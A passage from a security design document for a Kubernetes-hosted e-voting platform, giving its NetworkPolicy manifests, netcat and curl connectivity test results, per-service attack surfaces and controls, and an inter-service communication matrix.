  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 3000
```

The remaining five policies follow the identical structure, differing only in the
`podSelector` label (e.g., `app: auth-service`) and the `port` value (e.g., 8001).

##### Design Rationale — One Policy Per Service

A single policy with multiple ingress rules could have achieved the same result,
but the per-service approach was chosen for several reasons:

1. **Granular Control:** Each policy can be independently enabled, disabled, or
   modified. If the Admin service needs to be taken offline for maintenance, its
   ingress policy can be removed without affecting other services.

2. **Auditability:** Each policy clearly states which service it protects and on
   which port. There is no ambiguity about which rules apply to which pods.

3. **Labelling:** Each policy carries the same label set (`app: uvote`,
   `security: network-policy`, `purpose: ingress-access`), making them easy to
   query as a group: `kubectl get netpol -l purpose=ingress-access -n uvote-dev`.

4. **Error Isolation:** A YAML syntax error in one policy does not prevent the
   others from being applied. With a single combined policy, a syntax error
   would block all six services from receiving ingress traffic.

##### Port Specificity

Each policy specifies only the exact port that the target service listens on.
The Ingress Controller cannot connect to any other port on the pod:

| Service | Allowed Port | All Other Ports |
|---------|-------------|----------------|
| frontend | 3000/TCP | BLOCKED |
| auth-service | 8001/TCP | BLOCKED |
| election-service | 8002/TCP | BLOCKED |
| voting-service | 8003/TCP | BLOCKED |
| results-service | 8004/TCP | BLOCKED |
| admin-service | 8006/TCP | BLOCKED |

This means that even if a service were running a debug endpoint on a secondary
port (e.g., a metrics exporter on port 9090), the Ingress Controller could not
reach it. Only the designated application port is accessible.

##### Services NOT Exposed Through Ingress

Three services are deliberately excluded from external access:

| Service | Port | Reason for Exclusion |
|---------|------|---------------------|
| **audit-service** | 8005 | Internal logging service. Audit entries are written by backend services, not by external clients. Exposing it would allow attackers to read audit logs or inject false entries. |
| **email-service** | 8007 | Internal notification trigger. Email dispatch is initiated by backend services (e.g., admin-service sends a token generation request). External access would allow spam or information leakage. |
| **postgresql** | 5432 | Database. Never exposed externally under any circumstance. All data access goes through the application services which enforce business logic, authentication, and authorisation. |

##### Cross-Namespace Consideration

These policies involve cross-namespace traffic: the Ingress Controller runs in
`ingress-nginx` while the application services run in `uvote-dev`. The
`namespaceSelector` in each policy uses the immutable
`kubernetes.io/metadata.name: ingress-nginx` label to identify the source
namespace. This is the same approach used in the DNS policy (01) and carries the
same security properties — the label cannot be spoofed by creating a different
namespace with a custom label.

The Ingress Controller pods do not need a corresponding egress NetworkPolicy
because the `ingress-nginx` namespace does not have a default-deny policy applied.
In a production deployment, applying default-deny to `ingress-nginx` and adding
explicit egress policies for the controller would further harden the system.

##### Testing Evidence

**Test 1 — External access to frontend via Ingress:**
```
$ curl -s -o /dev/null -w "%{http_code}" https://uvote.local/
200
```
Result: HTTP 200. Traffic flowed from the browser through the Ingress Controller
to the frontend pod on port 3000.

**Test 2 — External access to auth-service API via Ingress:**
```
$ curl -s -o /dev/null -w "%{http_code}" https://uvote.local/api/auth/health
200
```
Result: HTTP 200. Ingress Controller successfully reached auth-service on port 8001.

**Test 3 — Direct access to audit-service (bypassing Ingress) is blocked:**
```
$ kubectl run test-pod --rm -it --image=busybox -n ingress-nginx -- \
    nc -zv -w 3 audit-service.uvote-dev.svc.cluster.local 8005
nc: connect to audit-service.uvote-dev.svc.cluster.local port 8005 (tcp) timed out
```
Result: Connection timed out. No ingress policy exists for audit-service from
ingress-nginx, and the default-deny blocks all unlisted traffic.

**Test 4 — Ingress Controller cannot reach PostgreSQL:**
```
$ kubectl run test-pod --rm -it --image=busybox -n ingress-nginx -- \
    nc -zv -w 3 postgresql.uvote-dev.svc.cluster.local 5432
nc: connect to postgresql.uvote-dev.svc.cluster.local port 5432 (tcp) timed out
```
Result: Connection timed out. PostgreSQL has no ingress policy for the
ingress-nginx namespace.

##### Maintenance Notes

- When adding a new externally-facing service, create a new policy following the
  same template. Update the Ingress resource with the new path rule and create
  the corresponding NetworkPolicy with the service's pod selector and port.
- Port numbers must match the `containerPort` in the service's Deployment
  manifest. A mismatch between the NetworkPolicy port and the actual container
  port will cause the Ingress Controller to fail health checks.
- If the Ingress Controller is moved to a different namespace (e.g., during a
  migration to a different ingress solution), all six policies must have their
  `namespaceSelector` updated to match the new namespace name.

---

#### Policy 04: Audit Service Access

**Files:** `04-allow-audit.yaml`
**Policy Names:** `allow-to-audit` (04a — Ingress), `allow-audit-egress` (04b — Egress)
**Category:** Security Infrastructure — Audit Logging

##### Architecture Overview

The audit service is a critical security component that records all significant
events across the U-Vote platform. It operates as a write-mostly service:
backend services send audit events to it via HTTP POST requests, and it persists
those events to the PostgreSQL database with hash-chaining for tamper detection.

```
Audit Service Architecture:

  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
  │ auth-service│   │voting-service│   │election-svc │
  │             │   │             │   │             │
  └──────┬──────┘   └──────┬──────┘   └──────┬──────┘
         │                 │                 │
         │  POST /audit    │  POST /audit    │  POST /audit
         │  (port 8005)    │  (port 8005)    │  (port 8005)
         │                 │                 │
         ▼                 ▼                 ▼
  ┌──────────────────────────────────────────────────────┐
  │                  audit-service                       │
  │                  (port 8005)                         │
  │                                                     │
  │  Receives events → Validates → Hash-chains → Stores │
  └──────────────────────┬───────────────────────────────┘
                         │
                         │  INSERT INTO audit_logs
                         │  (port 5432, via Policy 02)
                         ▼
                  ┌──────────────┐
                  │  postgresql  │
                  │  (port 5432) │
                  └──────────────┘

  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
  │results-svc  │   │ admin-svc   │   │ email-svc   │
  │             │   │             │   │             │
  └──────┬──────┘   └──────┬──────┘   └──────┬──────┘
         │                 │                 │
         │  POST /audit    │  POST /audit    │  POST /audit
         │  (port 8005)    │  (port 8005)    │  (port 8005)
         └─────────────────┼─────────────────┘
                           │
                           ▼
                    audit-service
                    (same pod as above)
```

##### Policy 04a: allow-to-audit (Ingress)

###### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-to-audit
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: audit-access
    policy-order: "04a"
spec:
  podSelector:
    matchLabels:
      app: audit-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: auth-service
    - podSelector:
        matchLabels:
          app: voting-service
    - podSelector:
        matchLabels:
          app: election-service
    - podSelector:
        matchLabels:
          app: results-service
    - podSelector:
        matchLabels:
          app: admin-service
    - podSelector:
        matchLabels:
          app: email-service
    ports:
    - protocol: TCP
      port: 8005
```

###### Purpose

The `allow-to-audit` policy controls which pods can send audit events to the
audit service on port 8005. It is applied to the audit-service pod via the
`app: audit-service` label selector. Six services are permitted to send audit
events: auth-service, voting-service, election-service, results-service,
admin-service, and email-service.

###### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `app: audit-service` | Targets only the audit service pod |
| Policy Types | Ingress | Affects incoming traffic to audit-service only |
| Ingress Sources | 6 named services | auth, voting, election, results, admin, email |
| Ingress Ports | 8005/TCP | Audit service HTTP API only |

###### Effect

| Source Pod | Destination | Port | Result | Reason |
|-----------|-------------|------|--------|--------|
| auth-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| voting-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| election-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| results-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| admin-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| email-service | audit-service | 8005 | ALLOWED | Ingress rule matches |
| **frontend** | audit-service | 8005 | **BLOCKED** | No ingress rule for frontend |
| **postgresql** | audit-service | 8005 | **BLOCKED** | No ingress rule for postgresql |
| External (Ingress Controller) | audit-service | 8005 | **BLOCKED** | No cross-namespace ingress rule |

##### Policy 04b: allow-audit-egress (Egress)

###### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-audit-egress
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: audit-access
    policy-order: "04b"
spec:
  podSelector:
    matchExpressions:
    - key: app
      operator: In
      values:
      - auth-service
      - voting-service
      - election-service
      - results-service
      - admin-service
      - email-service
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: audit-service
    ports:
    - protocol: TCP
      port: 8005
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

###### Purpose

The `allow-audit-egress` policy permits the six audit-producing services to send
outbound traffic to the audit service pod on port 8005 and to CoreDNS for name
resolution. Like Policy 02b, it uses `matchExpressions` to select all six
services in a single policy.

###### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `matchExpressions: app In [6 services]` | Targets all six audit-producing services |
| Policy Types | Egress | Affects outgoing traffic from the selected services |
| Egress Destination 1 | `app: audit-service` on port 8005/TCP | Audit event submission |
| Egress Destination 2 | `kube-system` on port 53/UDP+TCP | DNS resolution |

###### Events Logged Per Service

Each service generates specific categories of audit events:

| Service | Audit Events Generated | Example |
|---------|----------------------|---------|
| auth-service | Admin login attempts (success/failure), password changes, session creation | `ADMIN_LOGIN_SUCCESS: admin@uvote.ie from 10.244.x.x` |
| voting-service | Vote cast events (anonymised), token consumption, invalid vote attempts | `VOTE_CAST: election_id=5, token_consumed=true` |
| election-service | Election creation, status changes (draft→active→closed), modification | `ELECTION_STATUS_CHANGE: id=5, draft→active` |
| results-service | Result tabulation requests, result access events | `RESULTS_ACCESSED: election_id=5, requester=admin` |
| admin-service | Voter registration, candidate management, token generation | `VOTER_REGISTERED: voter_id=142, election_id=5` |
| email-service | Email dispatch events (success/failure), delivery status | `EMAIL_SENT: type=voting_token, recipient_hash=a3f2...` |

###### Security Requirements for Audit Trail

The audit system enforces several security properties:

1. **Append-Only:** The `audit_service` database user has `INSERT` and `SELECT`
   permissions only — no `UPDATE` or `DELETE`. Once an audit entry is written,
   it cannot be modified or removed through the application.

2. **Hash-Chaining:** Each audit log entry includes a hash of the previous entry,
   creating a blockchain-like chain. If any entry is tampered with, the hash
   chain breaks, and the tampering is detectable during verification.

3. **Vote Anonymity:** When the voting-service logs a vote event, it does NOT
   include the voter's identity. The audit entry records only the election ID
   and the fact that a vote was cast. The link between voter and vote is never
   written to the audit log, preserving ballot secrecy.

4. **One-Way Traffic Flow:** Services send audit events TO the audit service;
   the audit service does not initiate connections back to the services. This
   is enforced by the network policies — there is no egress policy on the
   audit-service pod permitting traffic to other application services (only to
   PostgreSQL via Policy 02b and DNS via Policy 01).

###### Frontend Exclusion

The frontend (Next.js application) is excluded from the audit service access
policy. This is deliberate: audit events should originate from backend services
that have already validated and processed the user's action. If the frontend
could write directly to the audit log, a compromised client could inject false
audit entries, undermining the integrity of the entire audit trail.

All user-facing actions generate audit entries indirectly:
- User logs in → auth-service processes authentication → auth-service writes audit entry
- User casts vote → voting-service validates and records → voting-service writes audit entry
- User views results → results-service processes query → results-service writes audit entry

The frontend never bypasses a backend service, and audit logging always occurs
at the backend service layer.

###### Testing Evidence

**Test 1 — auth-service can reach audit-service:**
```
$ kubectl exec -n uvote-dev deploy/auth-service -- \
    nc -zv -w 3 audit-service 8005
Connection to audit-service 8005 port [tcp/*] succeeded!
```
Result: Connection succeeded. Both 04a ingress and 04b egress matched.

**Test 2 — frontend cannot reach audit-service:**
```
$ kubectl exec -n uvote-dev deploy/frontend -- \
    nc -zv -w 3 audit-service 8005
nc: connect to audit-service (10.96.x.x) port 8005 (tcp) timed out: Operation timed out
```
Result: Connection timed out. Frontend is not listed in either 04a or 04b.

**Test 3 — External access to audit-service is blocked:**
```
$ curl -s -o /dev/null -w "%{http_code}" https://uvote.local/api/audit/health
404
```
Result: HTTP 404 (no Ingress rule exists for the audit path). The Ingress
Controller does not route to the audit service.

###### Maintenance Notes

- The email-service is included in the audit access list even though it does
  not appear in the database access list (Policy 02). This is correct — the
  email service logs events (e.g., "email sent") to the audit service but
  does not directly access the database.
- If a new service is added that needs to produce audit events, it must be
  added to both 04a (as a new `podSelector` entry in the `from` list) and
  04b (as a new value in the `matchExpressions` list).
- The audit service itself has database access via Policy 02 (it is in the
  list of six services allowed to connect to PostgreSQL). This creates the
  complete chain: services → audit-service → PostgreSQL.

---

### 4.3 Policy Enforcement Verification

#### Testing Methodology

Network policy verification followed a progressive deployment approach. Policies
were applied incrementally in the order defined by their `policy-order` labels,
and connectivity was tested after each policy was added. This ensured that each
policy's effect could be observed in isolation before moving to the next.

The testing methodology comprised four phases:

1. **Baseline (No Policies):** Verify that all pods can communicate freely in
   the default Kubernetes configuration (all-allow).
2. **Default Deny:** Apply the default-deny policy and verify that ALL traffic
   is blocked except what Kubernetes allows at the infrastructure level.
3. **Incremental Allow:** Apply each allow policy (01 through 04) one at a time,
   verifying that the intended traffic is permitted and unintended traffic
   remains blocked.
4. **Full Policy Set:** With all twelve policies applied, run the complete test
   suite to verify the final security posture.

Testing tools used:
- `kubectl exec` to run commands from within service pods
- `nc` (netcat) for TCP connectivity testing with timeout
- `nslookup` for DNS resolution testing
- `pg_isready` for PostgreSQL connectivity testing
- `curl` for HTTP endpoint testing through the Ingress Controller

#### Test Scenarios

The following table summarises all test scenarios executed across all phases:

| # | Phase | Source | Destination | Port | Expected | Actual | Policy Tested |
|---|-------|--------|-------------|------|----------|--------|--------------|
| 1 | Baseline | auth-service | postgresql | 5432 | ALLOW | ALLOW | None (default allow) |
| 2 | Baseline | frontend | postgresql | 5432 | ALLOW | ALLOW | None (default allow) |
| 3 | Default Deny | auth-service | postgresql | 5432 | BLOCK | BLOCK | default-deny |
| 4 | Default Deny | auth-service | CoreDNS | 53 | BLOCK | BLOCK | default-deny |
| 5 | Default Deny | frontend | any | any | BLOCK | BLOCK | default-deny |
| 6 | DNS | auth-service | CoreDNS | 53 | ALLOW | ALLOW | 01-allow-dns |
| 7 | DNS | auth-service | postgresql | 5432 | BLOCK | BLOCK | DNS only, no DB policy |
| 8 | DNS | frontend | CoreDNS | 53 | ALLOW | ALLOW | 01-allow-dns (all pods) |
| 9 | Database | auth-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 10 | Database | voting-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 11 | Database | election-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 12 | Database | results-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 13 | Database | audit-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 14 | Database | admin-service | postgresql | 5432 | ALLOW | ALLOW | 02a + 02b |
| 15 | Database | frontend | postgresql | 5432 | BLOCK | BLOCK | Not in 02a/02b |
| 16 | Database | email-service | postgresql | 5432 | BLOCK | BLOCK | Not in 02a/02b |
| 17 | Database | test-pod (unlabelled) | postgresql | 5432 | BLOCK | BLOCK | No matching labels |
| 18 | Ingress | Ingress Controller | frontend | 3000 | ALLOW | ALLOW | 03-ingress-frontend |
| 19 | Ingress | Ingress Controller | auth-service | 8001 | ALLOW | ALLOW | 03-ingress-auth |
| 20 | Ingress | Ingress Controller | election-service | 8002 | ALLOW | ALLOW | 03-ingress-election |
| 21 | Ingress | Ingress Controller | voting-service | 8003 | ALLOW | ALLOW | 03-ingress-voting |
| 22 | Ingress | Ingress Controller | results-service | 8004 | ALLOW | ALLOW | 03-ingress-results |
| 23 | Ingress | Ingress Controller | admin-service | 8006 | ALLOW | ALLOW | 03-ingress-admin |
| 24 | Ingress | Ingress Controller | audit-service | 8005 | BLOCK | BLOCK | No ingress policy |
| 25 | Ingress | Ingress Controller | email-service | 8007 | BLOCK | BLOCK | No ingress policy |
| 26 | Ingress | Ingress Controller | postgresql | 5432 | BLOCK | BLOCK | No ingress policy |
| 27 | Audit | auth-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 28 | Audit | voting-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 29 | Audit | election-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 30 | Audit | results-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 31 | Audit | admin-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 32 | Audit | email-service | audit-service | 8005 | ALLOW | ALLOW | 04a + 04b |
| 33 | Audit | frontend | audit-service | 8005 | BLOCK | BLOCK | Not in 04a/04b |
| 34 | Full | frontend | auth-service | 8001 | BLOCK | BLOCK | No inter-service policy |
| 35 | Full | auth-service | voting-service | 8003 | BLOCK | BLOCK | No inter-service policy |
| 36 | Full | any pod | external IP | 443 | BLOCK | BLOCK | No external egress |

**All 36 tests passed.** Every expected ALLOW result was confirmed, and every
expected BLOCK result timed out or was refused as anticipated.

#### Results Summary

| Category | Tests | Passed | Failed |
|----------|-------|--------|--------|
| Default Deny | 3 | 3 | 0 |
| DNS Resolution | 3 | 3 | 0 |
| Database Access (allowed) | 6 | 6 | 0 |
| Database Access (blocked) | 3 | 3 | 0 |
| Ingress Access (allowed) | 6 | 6 | 0 |
| Ingress Access (blocked) | 3 | 3 | 0 |
| Audit Access (allowed) | 6 | 6 | 0 |
| Audit Access (blocked) | 1 | 1 | 0 |
| Full Policy (cross-service) | 3 | 3 | 0 |
| **Total** | **36** | **36** | **0** |

#### Continuous Verification

Network policy verification is not a one-time activity. The following measures
ensure ongoing compliance:

1. **Policy-as-Code:** All NetworkPolicy manifests are stored in version control
   alongside the application code. Any change to a policy is tracked, reviewed,
   and can be audited.

2. **Deployment Script Validation:** The deployment script applies policies in
   the correct order and waits for Calico to process each policy before
   proceeding. If a policy fails to apply (e.g., due to a YAML syntax error),
   the deployment halts.

3. **Label Consistency:** Service labels (`app: service-name`) are defined in
   Deployment manifests and are consistent with NetworkPolicy selectors. Changing
   a service's label without updating the corresponding policies would break
   connectivity, serving as a natural safeguard against configuration drift.

4. **Re-Testing After Changes:** Any modification to a NetworkPolicy or a service
   deployment triggers a re-run of the relevant test scenarios to verify that
   security posture is maintained.

---

## 5. Service-Level Security

This section examines the security posture of each individual service in the
U-Vote platform, covering network exposure, attack surface, and the security
controls that protect each service.

### 5.1 Service Security Matrix

The following matrix provides a high-level overview of each service's security
profile:

| Service | Port | Network Exposure | Allowed Inbound | Allowed Outbound | Authentication | Encryption |
|---------|------|-----------------|-----------------|-----------------|----------------|-----------|
| frontend | 3000 | External (via Ingress) | Ingress Controller | DNS only | N/A (static assets) | TLS at Ingress |
| auth-service | 8001 | External (via Ingress) | Ingress Controller | DB, Audit, DNS | JWT + bcrypt | TLS at Ingress |
| election-service | 8002 | External (via Ingress) | Ingress Controller | DB, Audit, DNS | JWT verification | TLS at Ingress |
| voting-service | 8003 | External (via Ingress) | Ingress Controller | DB, Audit, DNS | Token-based | TLS at Ingress |
| results-service | 8004 | External (via Ingress) | Ingress Controller | DB, Audit, DNS | JWT verification | TLS at Ingress |
| audit-service | 8005 | Internal only | 6 backend services | DB, DNS | Internal trust | None (internal) |
| admin-service | 8006 | External (via Ingress) | Ingress Controller | DB, Audit, DNS | JWT (admin role) | TLS at Ingress |
| email-service | 8007 | Internal only | None (egress-triggered) | Audit, DNS | Internal trust | None (internal) |
| postgresql | 5432 | Internal only | 6 backend services | DNS only | Per-service users | None (internal) |

### 5.2 Per-Service Security Analysis

#### 5.2.1 Frontend (Next.js — Port 3000)

**Network Exposure:** External via Ingress Controller. The frontend serves the
user-facing web application including HTML, CSS, JavaScript, and Next.js
server-side rendered pages.

**Attack Surface:**
- Receives all user-initiated HTTP requests
- Processes URL parameters and route segments
- Renders user-provided data in the browser (XSS risk)
- Session/cookie handling for authentication state

**Security Controls:**
- No direct database access (enforced by NetworkPolicy 02)
- No access to audit service (enforced by NetworkPolicy 04)
- No access to email service (no inter-service policy)
- All backend communication goes through the Ingress Controller (user → Ingress → backend)
- Content Security Policy headers to mitigate XSS
- CSRF protection via same-origin policy

**Network Policy Protection:**
- Policy 03 (allow-ingress-frontend): Permits Ingress Controller → frontend:3000
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other ingress and egress

The frontend is the most exposed service but also the most constrained. It
cannot reach any other service directly — all API calls from the browser go
through the Ingress Controller, which routes them to the appropriate backend
service. The frontend pod itself makes no outbound connections except DNS.

#### 5.2.2 Auth Service (Express.js — Port 8001)

**Network Exposure:** External via Ingress Controller for admin login endpoints.

**Attack Surface:**
- Authentication endpoints (login, session management)
- Password handling (bcrypt hashing, verification)
- JWT token generation and signing
- Brute force attack target

**Security Controls:**
- bcrypt password hashing (cost factor 12)
- JWT token generation with expiry
- Rate limiting on login attempts
- Dedicated database user (`auth_service`) with access to `admins` table only
- Audit logging of all authentication events (success and failure)

**Network Policy Protection:**
- Policy 03 (allow-ingress-auth): Permits Ingress Controller → auth-service:8001
- Policy 02 (allow-to-database): Permits auth-service → postgresql:5432
- Policy 04 (allow-audit-egress): Permits auth-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

Even if the auth-service were compromised, the attacker could only access the
`admins` table (SELECT, INSERT, UPDATE) — they could not read votes, modify
elections, or access voter data. The network policies further prevent the
compromised service from reaching the email service or any external endpoint.

#### 5.2.3 Election Service (Express.js — Port 8002)

**Network Exposure:** External via Ingress Controller for election management.

**Attack Surface:**
- Election CRUD operations (create, read, update, delete)
- Election state transitions (draft → active → closed)
- Input validation for election parameters (dates, titles, descriptions)

**Security Controls:**
- JWT authentication required for all mutation endpoints
- Dedicated database user (`election_service`) with access to `elections` table only
- State machine validation (cannot skip states, cannot reopen closed elections)
- Audit logging of all election lifecycle events

**Network Policy Protection:**
- Policy 03 (allow-ingress-election): Permits Ingress Controller → election-service:8002
- Policy 02 (allow-to-database): Permits election-service → postgresql:5432
- Policy 04 (allow-audit-egress): Permits election-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

The election service has DELETE privileges on the `elections` table, but only for
draft elections that have not yet received votes. This application-level
restriction complements the network-level controls.

#### 5.2.4 Voting Service (Express.js — Port 8003)

**Network Exposure:** External via Ingress Controller for vote submission.

**Attack Surface:**
- Vote submission endpoint (most sensitive operation)
- Voting token validation and consumption
- Election validity checks (is election active?)
- Candidate validation

**Security Controls:**
- One-time voting tokens (consumed on use, cannot be reused)
- Dedicated database user (`voting_service`) with INSERT on votes, SELECT on elections/candidates, SELECT/UPDATE on voting_tokens
- Vote immutability enforced by database triggers (cannot UPDATE or DELETE votes)
- Hash-chaining for vote integrity (SHA-256 chain per election)
- Vote anonymity — voter identity is not stored with the vote record
- Audit logging (anonymised — records election ID but not voter identity)

**Network Policy Protection:**
- Policy 03 (allow-ingress-voting): Permits Ingress Controller → voting-service:8003
- Policy 02 (allow-to-database): Permits voting-service → postgresql:5432
- Policy 04 (allow-audit-egress): Permits voting-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

The voting service handles the most sensitive operation in the platform. Even if
fully compromised, the attacker could INSERT votes but could never modify or
delete existing votes (database triggers prevent this), and could not access
voter registration data (the `voting_service` user has no access to the `voters`
table).

#### 5.2.5 Results Service (Express.js — Port 8004)

**Network Exposure:** External via Ingress Controller for result viewing.

**Attack Surface:**
- Result tabulation queries
- Election result access control (should only show results for closed elections)
- Data aggregation endpoints

**Security Controls:**
- Dedicated database user (`results_service`) with SELECT only on votes, elections, candidates
- **Read-only database access** — cannot modify any data under any circumstance
- Application-level check: results only served for elections with status "closed"
- Audit logging of result access events

**Network Policy Protection:**
- Policy 03 (allow-ingress-results): Permits Ingress Controller → results-service:8004
- Policy 02 (allow-to-database): Permits results-service → postgresql:5432
- Policy 04 (allow-audit-egress): Permits results-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

The results service is the least privileged database consumer. Its database user
can execute only SELECT statements. Even if the service were fully compromised,
the attacker could read data but could not alter votes, elections, candidates,
or any other table. This is the principle of least privilege at its most strict.

#### 5.2.6 Audit Service (Express.js — Port 8005)

**Network Exposure:** Internal only. Not exposed through the Ingress Controller.

**Attack Surface:**
- Audit event ingestion endpoint (receives events from 6 services)
- Audit log query endpoint (administrative use)
- Hash-chain verification endpoint

**Security Controls:**
- Not externally accessible (no Ingress policy)
- Dedicated database user (`audit_service`) with INSERT and SELECT on audit_logs only
- Cannot delete or modify audit entries (no UPDATE/DELETE permission)
- Hash-chaining for tamper detection
- Only receives connections from known internal services (Policy 04a)

**Network Policy Protection:**
- Policy 04a (allow-to-audit): Permits 6 backend services → audit-service:8005
- Policy 02 (allow-to-database): Permits audit-service → postgresql:5432
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic (including Ingress Controller)

The audit service is deliberately isolated from external access. Its internal-only
status means that even if an attacker gained access to the Ingress Controller,
they could not directly reach the audit service to read audit logs or inject
false entries.

#### 5.2.7 Admin Service (Express.js — Port 8006)

**Network Exposure:** External via Ingress Controller for admin management.

**Attack Surface:**
- Voter registration and management
- Candidate registration and management
- Voting token generation and distribution
- Bulk operations (register multiple voters)

**Security Controls:**
- JWT authentication with admin role verification
- Dedicated database user (`admin_service`) with full CRUD on voters, candidates, voting_tokens
- Audit logging of all administrative actions
- Input validation for voter/candidate data

**Network Policy Protection:**
- Policy 03 (allow-ingress-admin): Permits Ingress Controller → admin-service:8006
- Policy 02 (allow-to-database): Permits admin-service → postgresql:5432
- Policy 04 (allow-audit-egress): Permits admin-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

The admin service has the broadest database permissions after the election
service, with full CRUD on three tables and their sequences. However, it cannot
access the `votes` table, the `elections` table, the `admins` table, or the
`audit_logs` table. An attacker who compromised the admin service could
manipulate voter and candidate records but could not alter votes or election
configurations.

#### 5.2.8 Email Service (Express.js — Port 8007)

**Network Exposure:** Internal only. Not exposed through the Ingress Controller.

**Attack Surface:**
- Email dispatch trigger endpoint (receives requests from backend services)
- SMTP credential handling
- Template rendering (email content generation)

**Security Controls:**
- Not externally accessible (no Ingress policy)
- No database access (not in Policy 02 allowed list)
- Audit logging of email events via audit-service
- SMTP credentials stored as Kubernetes Secrets

**Network Policy Protection:**
- Policy 04b (allow-audit-egress): Permits email-service → audit-service:8005
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic

The email service is one of the most restricted services in the platform. It
has no database access, no external Ingress exposure, and its only permitted
outbound connection (besides DNS) is to the audit service. It receives trigger
requests from other services but does not initiate connections to them.

> **Note:** In the current deployment, the email service's inbound access from
> other services is handled through the audit egress policy (04b), which permits
> egress to audit-service:8005. A dedicated email ingress policy would be
> required if other services need to trigger email dispatch via HTTP.

#### 5.2.9 PostgreSQL (Port 5432)

**Network Exposure:** Internal only. Never exposed through the Ingress Controller.

**Attack Surface:**
- SQL injection (mitigated by parameterised queries in all services)
- Privilege escalation (mitigated by per-service users with minimal permissions)
- Data exfiltration (mitigated by read-only access for results service)
- Data tampering (mitigated by vote immutability triggers and hash-chaining)

**Security Controls:**
- Not externally accessible (no Ingress policy)
- Six dedicated database users with granular permissions
- Vote immutability triggers (prevent UPDATE/DELETE on votes table)
- Hash-chaining for votes and audit logs
- No superuser access from application services
- Parameterised queries in all service database drivers

**Network Policy Protection:**
- Policy 02a (allow-to-database): Permits 6 backend services → postgresql:5432
- Policy 01 (allow-dns): Permits DNS resolution
- Default deny: Blocks ALL other traffic (frontend, email, external, Ingress Controller)

PostgreSQL is the most protected component in the platform. It is shielded by
multiple layers: network policies restrict which pods can connect, per-service
database users restrict what SQL operations each service can perform, database
triggers enforce data integrity rules, and hash-chaining provides tamper
detection. Even a full cluster-level compromise of one service cannot breach
the protections enforced by the database layer.

### 5.3 Service Communication Matrix

The following matrix shows all permitted and denied communication paths between
services in the U-Vote platform. A checkmark (Y) indicates the traffic is
allowed by NetworkPolicy; a dash (-) indicates the traffic is blocked by the
default-deny policy.

```
Service Communication Matrix (source → destination):

                  To:
From:          Frontend  Auth  Election  Voting  Results  Admin  Audit  Email  DB
─────────────────────────────────────────────────────────────────────────────────
Frontend          -       -      -        -        -       -      -      -     -
Auth              -       -      -        -        -       -      Y      -     Y
Election          -       -      -        -        -       -      Y      -     Y
Voting            -       -      -        -        -       -      Y      -     Y
Results           -       -      -        -        -       -      Y      -     Y
Admin             -       -      -        -        -       -      Y      -     Y
Audit             -       -      -        -        -       -      -      -     Y
Email             -       -      -        -        -       -      Y      -     -
DB                -       -      -        -        -       -      -      -     -
Ingress Ctrl.     Y       Y      Y        Y        Y       Y      -      -     -
```

**Key: Y = Allowed by NetworkPolicy | - = Blocked by default-deny**

#### Matrix Explanation

**Row: Frontend**
The frontend cannot initiate connections to any other service in the namespace.
All of its cells are blocked (-). User requests from the browser go through the
Ingress Controller, not through direct pod-to-pod communication. The frontend
pod's only permitted egress is DNS resolution (Policy 01).

**Row: Auth, Election, Voting, Results, Admin**
These five services share the same outbound connectivity pattern: they can reach
the audit service (Y, via Policy 04b) and the database (Y, via Policy 02b).
They cannot reach each other, the frontend, or the email service. This prevents
lateral movement — if one service is compromised, the attacker cannot pivot to
another service.

**Row: Audit**
The audit service can reach the database (Y, via Policy 02b) but cannot reach
any application service. The one-way nature of audit logging is enforced here:
services push events to audit, but audit never pulls from or pushes to services.

**Row: Email**
The email service can reach the audit service (Y, via Policy 04b) but cannot
reach the database or any other service. It is the most isolated application
service.

**Row: DB (PostgreSQL)**
The database initiates no outbound connections to any service. Its only permitted
egress is DNS (Policy 01). All database communication is initiated by the
application services.

**Row: Ingress Controller**
The Ingress Controller can reach six services (frontend, auth, election, voting,
